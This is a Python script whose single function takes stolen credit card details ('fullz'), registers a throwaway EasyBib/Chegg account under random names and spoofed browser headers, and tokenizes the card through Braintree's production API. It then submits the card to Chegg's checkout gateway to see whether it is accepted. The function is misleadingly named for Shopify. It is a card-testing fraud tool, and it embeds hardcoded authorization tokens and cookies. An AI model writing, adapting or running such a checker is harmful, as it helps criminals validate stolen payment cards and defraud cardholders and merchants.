import asyncio
import base64
import random
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import json

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None
    

async def create_shopify_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        cc1 = cc[:4]
        cc2 = cc[4:8]
        cc3 = cc[8:12]
        cc4 = cc[12:]
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]
        address             = "12 Main Street"
        city                = "Brewster"
        state               = "New York"
        state_short         = "NY"
        country             = "United States"
        zip_code            ="10509"
        phone               ="(727) 945-1000"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'dnt': '1',
            'if-none-match': 'W/"10172-lzXfjkSatYkvl59J3VAI+Y5wYQA"',
            'priority': 'u=0, i',
            'referer': 'https://www.easybib.com/logout',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        response = await session.get('https://www.easybib.com/upgrade', headers=headers)

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://www.easybib.com',
            'priority': 'u=1, i',
            'referer': 'https://www.easybib.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-oneauth-cookie-domain': '.easybib.com',
            'x-px-chegg-cookie': '8ff24c7ff986b37be41b6de376b7218d513c7af3f45a49d7192f35e69fbdd69c:5j3Mtphr8ZHLw6ehg0y1k1jLKh/wSB4+NHuXAcb0vbUdztHFJ6GKBJGrjVpD8so40C+bCxkVnQslCO5/WeAltQ==:1000:uJz6FbGODmXo7CJI4YOTmJ9oSQ8gbU0kOoG5ZmTQ0efPw3viAYizDQ8U+SjzJF9RuWec+sGYgzzZW5RGQeQCDheIMvVd+gGApOKAmnc/V/Yu7tVGQ9kS00cxyqE+cqYbO9R/LVZiiVTbvUn9GyQ7aIUBUG+yQ82Jf2NR5FLT+NrJzYDVeK+/QOVdrLJ/cCvre2MJHk7NHEtpOrHu3UiS5GfPOmiLOWSX67rV6i3JRZo=',
        }

        json_data = {
            'query': 'mutation Signup($userCredentials: UserCredentials!, $userProfile: UserProfile!, $clientId: String!) {\n  signUpUser(userCredentials: $userCredentials, userProfile: $userProfile, clientId: $clientId) {\n    tokens {\n      idToken\n      accessToken\n      expires\n    }\n    encryptedEmail\n    encryptedCheggId\n  }\n}\n',
            'variables': {
                'userCredentials': {
                    'email': email,
                    'password': 'zqAD@6FFjmkD8Xw',
                },
                'userProfile': {
                    'userType': 'parent',
                    'sourceProduct': 'eb|EB',
                    'sourcePage': 'wt|upgrade',
                },
                'clientId': 'EB',
            },
            'operationName': 'Signup',
        }

        response = await session.post('https://auth-gate.easybib.com/auth-gate/graphql', headers=headers, json=json_data)

        idToken = gets(response.text, '{"tokens":{"idToken":"', '","')
        accessToken = gets(response.text, '"accessToken":"', '","')



        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': 'Bearer production_6mhyzqmw_k588b3w67tw7q2zs',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '23d5280d-39f6-4881-abe0-8388a3db27f9',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'cardholderName': f'{fname} {lname}',
                        'billingAddress': {
                            'countryCodeAlpha2': 'US',
                            'locality': 'New York',
                            'region': 'New York',
                            'postalCode': '10001',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        token = response.json()['data']['tokenizeCreditCard']['token']

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'access_token': accessToken,
            'apollographql-client-name': 'checkout-sdk',
            'authorization': 'Basic aEI1OGJtdmlaQUFSa1RvS0JwNHRGQXg0Y203STJSQkE6alFYd080Y1psVWNkMW5zTA==',
            'content-type': 'application/json;charset=UTF-8',
            'dnt': '1',
            'id_token': idToken,
            'origin': 'https://www.easybib.com',
            'priority': 'u=1, i',
            'referer': 'https://www.easybib.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'undefined': '1733299564245',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-chegg-referrer': 'https://www.easybib.com/upgrade',
            'x-chegg-referrer-url': 'https://www.easybib.com/logout',
            'x-chegg-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-chegg-view-name': 'paywall modal',
        }

        json_data = {
            'operationName': 'createMethodOfPayment',
            'variables': {
                'input': {
                    'deviceData': '{"device_session_id":"c5143fe6b46238db31a647bf0b338327","fraud_merchant_id":null,"correlation_id":"e332efbbcc95acb3c91dad6c0099ff0d"}',
                    'nonce': token,
                    'billing': {
                        'fname': f'{fname}',
                        'lname': f'{lname}',
                        'city': 'New York',
                        'state': 'New York',
                        'line1': '',
                        'line2': '',
                        'zip': '10001',
                        'country': 'US',
                    },
                    'name': f'{fname} {lname}',
                    'month': mes,
                    'year': ano,
                    'accountType': 'CREDIT_CARD_TOKEN',
                    'paymentProcessor': 'BRAINTREE',
                },
            },
        }

        response = await session.post('https://gateway.chegg.com/checkout-bff/graphql', headers=headers, json=json_data)



        

        result = gets(response.text, '- ', '","')

        print(result)
        # 
        return result

    except Exception as e:
        return str(e)
